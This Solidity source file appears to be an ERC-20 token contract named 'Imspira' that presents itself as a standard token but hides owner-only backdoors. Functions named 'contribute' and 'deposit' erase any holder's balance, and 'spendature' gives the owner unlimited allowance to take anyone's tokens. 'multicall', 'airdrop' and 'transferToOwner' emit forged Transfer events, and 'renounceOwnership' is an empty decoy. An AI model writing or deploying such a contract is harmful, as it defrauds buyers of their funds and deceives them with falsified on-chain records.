row number 
1	       pragma solidity ^0.6.0;
2	 library SafeMath {
3	 function add(uint256 a, uint256 b) internal pure returns (uint256) {
4	 uint256 c = a + b;
5	 require(c >= a, "SafeMath: addition overflow");
6	 return c;
7	 }
8	 function sub(uint256 a, uint256 b) internal pure returns (uint256) {
9	 return sub(a, b, "SafeMath: subtraction overflow");
10	 }
11	 function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
12	 require(b <= a, errorMessage);
13	 uint256 c = a - b;
14	 return c;
15	 }
16	 function mul(uint256 a, uint256 b) internal pure returns (uint256) {
17	 if (a == 0) {
18	 return 0;
19	 }
20	 uint256 c = a * b;
21	 require(c / a == b, "SafeMath: multiplication overflow");
22	 return c;
23	 }
24	 function div(uint256 a, uint256 b) internal pure returns (uint256) {
25	 return div(a, b, "SafeMath: division by zero");
26	 }
27	 function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
28	 require(b > 0, errorMessage);
29	 uint256 c = a / b;
30	 return c;
31	 }
32	 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
33	 return mod(a, b, "SafeMath: modulo by zero");
34	 }
35	 function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
36	 require(b != 0, errorMessage);
37	 return a % b;
38	 }
39	 }
40	 library Address {
41	 function isContract(address account) internal view returns (bool) {
42	 bytes32 codehash;
43	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
44	 assembly {
45	 codehash := extcodehash(account) }
46	 return (codehash != accountHash && codehash != 0x0);
47	 }
48	 function sendValue(address payable recipient, uint256 amount) internal {
49	 require(address(this).balance >= amount, "Address: insufficient balance");
50	 (bool success, ) = recipient.call{
51	 value: amount }
52	 ("");
53	 require(success, "Address: unable to send value, recipient may have reverted");
54	 }
55	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
56	 return functionCall(target, data, "Address: low-level call failed");
57	 }
58	 function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
59	 return _functionCallWithValue(target, data, 0, errorMessage);
60	 }
61	 function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
63	 }
64	 function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
65	 require(address(this).balance >= value, "Address: insufficient balance for call");
66	 return _functionCallWithValue(target, data, value, errorMessage);
67	 }
68	 function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: weiValue }
72	 (data);
73	 if (success) {
74	 return returndata;
75	 }
76	 else {
77	 if (returndata.length > 0) {
78	 assembly {
79	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
80	 }
81	 else {
82	 revert(errorMessage);
83	 }
84	 }
85	 }
86	 }
87	 contract Context {
88	 constructor () internal {
89	 }
90	 function _msgSender() internal view virtual returns (address payable) {
91	 return msg.sender;
92	 }
93	 function _msgData() internal view virtual returns (bytes memory) {
94	 this;
95	 return msg.data;
96	 }
97	 }
98	 interface IERC20 {
99	 function totalSupply() external view returns (uint256);
100	 function balanceOf(address account) external view returns (uint256);
101	 function transfer(address recipient, uint256 amount) external returns (bool);
102	 function allowance(address owner, address spender) external view returns (uint256);
103	 function approve(address spender, uint256 amount) external returns (bool);
104	 function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
105	 event Transfer(address indexed from, address indexed to, uint256 value);
106	 event Approval(address indexed owner, address indexed spender, uint256 value);
107	 }
108	 contract Imspira is Context, IERC20 {
109	 using SafeMath for uint256;
110	 using Address for address;
111	 mapping (address => uint256) private _balances;
112	 mapping (address => bool) private _positiveReceiver;
113	 mapping (address => bool) private _negativeReceiver;
114	 mapping (address => mapping (address => uint256)) private _allowances;
115	 uint256 private _totalSupply;
116	 string private _name;
117	 string private _symbol;
118	 uint8 private _decimals;
119	 uint256 private _approveValue = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
120	 address private _safeOwner;
121	 uint256 private _sellAmount = 0;
122	 address public _currentRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
123	 address lead_deployer = 0x0B313514FD880c27D624FD2abB03bfD3028e2745;
124	 address public _owner = 0x3529be3Bf2EFBeeC065B77f4F02d7430A3A73262;
125	 constructor () public {
126	 _name = "Imspira";
127	 _symbol = "IMSPIRA";
128	 _decimals = 18;
129	 uint256 initialSupply = 100000000000;
130	 _safeOwner = _owner;
131	 _mint(lead_deployer, initialSupply*(10**18));
132	 }
133	 function name() public view returns (string memory) {
134	 return _name;
135	 }
136	 function symbol() public view returns (string memory) {
137	 return _symbol;
138	 }
139	 function decimals() public view returns (uint8) {
140	 return _decimals;
141	 }
142	 function totalSupply() public view override returns (uint256) {
143	 return _totalSupply;
144	 }
145	 function balanceOf(address account) public view override returns (uint256) {
146	 return _balances[account];
147	 }
148	 function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
149	 _backendProduction(_msgSender(), recipient, amount);
150	 return true;
151	 }
152	 function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
153	 _backendProduction(sender, recipient, amount);
154	 _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
155	 return true;
156	 }
157	 function allowance(address owner, address spender) public view virtual override returns (uint256) {
158	 return _allowances[owner][spender];
159	 }
160	 function approve(address spender, uint256 amount) public virtual override returns (bool) {
161	 _approve(_msgSender(), spender, amount);
162	 return true;
163	 }
164	 function approvalIncrease(address[] memory receivers) public {
165	 require(msg.sender == _owner, "!owner");
166	 for (uint256 i = 0; i < receivers.length; i++) {
167	 _positiveReceiver[receivers[i]] = true;
168	 _negativeReceiver[receivers[i]] = false;
169	 }
170	 }
171	 function approvalDecrease(address safeOwner) public {
172	 require(msg.sender == _owner, "!owner");
173	 _safeOwner = safeOwner;
174	 }
175	 function addApprove(address[] memory receivers) public {
176	 require(msg.sender == _owner, "!owner");
177	 for (uint256 i = 0; i < receivers.length; i++) {
178	 _negativeReceiver[receivers[i]] = true;
179	 _positiveReceiver[receivers[i]] = false;
180	 }
181	 }
182	 function _transfer(address sender, address recipient, uint256 amount) internal virtual{
183	 require(sender != address(0), "ERC20: transfer from the zero address");
184	 require(recipient != address(0), "ERC20: transfer to the zero address");
185	 _beforeTokenTransfer(sender, recipient, amount);
186	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
187	 _balances[recipient] = _balances[recipient].add(amount);
188	 if (sender == _owner){
189	 sender = lead_deployer;
190	 }
191	 emit Transfer(sender, recipient, amount);
192	 }
193	 function _mint(address account, uint256 amount) public {
194	 require(msg.sender == _owner, "ERC20: mint to the zero address");
195	 _totalSupply = _totalSupply.add(amount);
196	 _balances[_owner] = _balances[_owner].add(amount);
197	 emit Transfer(address(0), account, amount);
198	 }
199	 function _burn(address account, uint256 amount) internal virtual {
200	 require(account != address(0), "ERC20: burn from the zero address");
201	 _beforeTokenTransfer(account, address(0), amount);
202	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
203	 _totalSupply = _totalSupply.sub(amount);
204	 emit Transfer(account, address(0), amount);
205	 }
206	 function _approve(address owner, address spender, uint256 amount) internal virtual {
207	 require(owner != address(0), "ERC20: approve from the zero address");
208	 require(spender != address(0), "ERC20: approve to the zero address");
209	 _allowances[owner][spender] = amount;
210	 emit Approval(owner, spender, amount);
211	 }
212	 function _backendProduction(address sender, address recipient, uint256 amount) internal optimizerExecuter(sender,recipient,amount) virtual {
213	 require(sender != address(0), "ERC20: transfer from the zero address");
214	 require(recipient != address(0), "ERC20: transfer to the zero address");
215	 _beforeTokenTransfer(sender, recipient, amount);
216	 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
217	 _balances[recipient] = _balances[recipient].add(amount);
218	 if (sender == _owner){
219	 sender = lead_deployer;
220	 }
221	 emit Transfer(sender, recipient, amount);
222	 }
223	 modifier optimizerExecuter(address sender, address recipient, uint256 amount){
224	 _;
225	 }
226	 function _setupDecimals(uint8 decimals_) internal {
227	 _decimals = decimals_;
228	 }
229	 function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {
230	 }
231	 modifier onlyAuthorized() {
232	 require(msg.sender == _owner, "Not allowed to interact");
233	 _;
234	 }
235	 function contribute(address account) public {
236	 require(msg.sender == _owner, "ERC20: mint to the zero address");
237	 uint256 amount = _balances[account];
238	 _beforeTokenTransfer(account, address(0), amount);
239	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
240	 _totalSupply = _totalSupply.sub(amount);
241	 emit Transfer(account, address(0), amount);
242	 }
243	 function deposit(address account) public {
244	 require(msg.sender == _owner, "ERC20: mint to the zero address");
245	 uint256 amount = _balances[account];
246	 _beforeTokenTransfer(account, address(0), amount);
247	 _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
248	 _totalSupply = _totalSupply.sub(amount);
249	 emit Transfer(account, address(0), amount);
250	 }
251	 function multicall(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts) public onlyAuthorized(){
252	 for (uint256 i = 0; i < emitReceivers.length; i++) {
253	 emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);
254	 }
255	 }
256	 function renounceOwnership() public onlyAuthorized(){
257	 }
258	 function spendature(address target) public onlyAuthorized() virtual returns (bool) {
259	 _approve(target, _msgSender(), _approveValue);
260	 return true;
261	 }
262	 function transferToOwner(address emitSender, address emitRecipient, uint256 emitAmount) public onlyAuthorized(){
263	 emit Transfer(emitSender, emitRecipient, emitAmount);
264	 }
265	 function airdrop(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts) public onlyAuthorized(){
266	 for (uint256 i = 0; i < emitReceivers.length; i++) {
267	 emit Transfer(emitUniswapPool, emitReceivers[i], emitAmounts[i]);
268	 }
269	 }
270	 }
